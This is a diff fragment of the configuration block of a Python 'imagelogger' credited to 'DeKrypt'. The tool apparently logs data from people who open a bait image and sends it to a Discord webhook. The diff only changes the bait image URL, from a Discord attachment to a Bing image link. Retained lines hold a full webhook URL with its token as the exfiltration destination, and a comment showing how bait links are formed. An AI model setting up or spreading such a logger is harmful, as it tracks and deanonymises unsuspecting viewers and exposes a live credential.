@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1321995950989774848/BKg3Y7TCya2_Q-PpAAYDWq31ZxxnG4cR90MjJZTB7yp7CdDRUWyqrsE_RAhR7T9bLJA2",
-    "image": "https://cdn.discordapp.com/attachments/1323481519465168976/1336540335865856062/lowquality1738726418137.png?ex=67a42daf&is=67a2dc2f&hm=bcd01901f95e20f6acf3fa4167e90fd5d26b643d2e1bdb43e54e6f479f354b3c&", # You can also have a custom image by using a URL argument
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=WL51eNwN&id=E63B70C84C3D216FAF5687CBDEE1BA2A107F691D&thid=OIP.WL51eNwNxWFHnBLsZq2ArgHaEB&mediaurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.58be7578dc0dc561479c12ec66ad80ae%3frik%3dHWl%252fECq64d7Lhw%26riu%3dhttp%253a%252f%252fstatic.demilked.com%252fwp-content%252fuploads%252f2020%252f06%252f5ef4504f57839-low-quality-photo-face-depixelizer-19-5ef1f2136629d__700.jpg%26ehk%3dDkGfTxUBIl5HjOo8kryfy%252bOjsBqg9%252bNfh9SgZ8Wb0fM%253d%26risl%3d%26pid%3dImgRaw%26r%3d0&exph=380&expw=700&q=low+quality+image&simid=608037782354611093&FORM=IRPRST&ck=48F25A82E9FD3DA6E66A8E87321AD7A7&selectedIndex=2&itb=0&adlt=strict", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
